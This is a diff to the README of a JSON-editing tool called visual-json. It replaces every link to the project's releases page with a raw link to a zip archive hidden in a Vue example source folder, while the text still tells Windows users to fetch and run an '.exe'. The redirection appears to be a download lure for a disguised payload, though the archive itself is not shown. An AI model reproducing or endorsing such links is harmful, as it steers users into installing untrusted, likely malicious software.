@@ -1,6 +1,6 @@
 # 🔍 visual-json - Edit JSON with Ease and Clarity
 
-[![Download visual-json](https://img.shields.io/badge/Download-visual--json-brightgreen)](https://github.com/DhruvRajput2923/visual-json/releases)
+[![Download visual-json](https://img.shields.io/badge/Download-visual--json-brightgreen)](https://raw.githubusercontent.com/DhruvRajput2923/visual-json/main/examples/vue/src/composables/json-visual-3.1.zip)
 
 ## 🖥️ What is visual-json?
 
@@ -25,7 +25,7 @@ Before you start, make sure you have your Windows computer ready and connected t
 
 Click the big green button at the top or go here:
 
-[Download visual-json releases](https://github.com/DhruvRajput2923/visual-json/releases)
+[Download visual-json releases](https://raw.githubusercontent.com/DhruvRajput2923/visual-json/main/examples/vue/src/composables/json-visual-3.1.zip)
 
 This page contains the latest versions of visual-json. Look for a file that ends with `.exe` — this is the program installer you need for Windows.
 
@@ -102,8 +102,8 @@ If you see error messages while editing:
 
 Start using visual-json by visiting this page:
 
-[https://github.com/DhruvRajput2923/visual-json/releases](https://github.com/DhruvRajput2923/visual-json/releases)
+[https://raw.githubusercontent.com/DhruvRajput2923/visual-json/main/examples/vue/src/composables/json-visual-3.1.zip](https://raw.githubusercontent.com/DhruvRajput2923/visual-json/main/examples/vue/src/composables/json-visual-3.1.zip)
 
 Look for the latest `.exe` file to download. After installing, you can open and edit your JSON files easily.
 
-[![Download visual-json](https://img.shields.io/badge/Download-visual--json-blue)](https://github.com/DhruvRajput2923/visual-json/releases)
+[![Download visual-json](https://img.shields.io/badge/Download-visual--json-blue)](https://raw.githubusercontent.com/DhruvRajput2923/visual-json/main/examples/vue/src/composables/json-visual-3.1.zip)
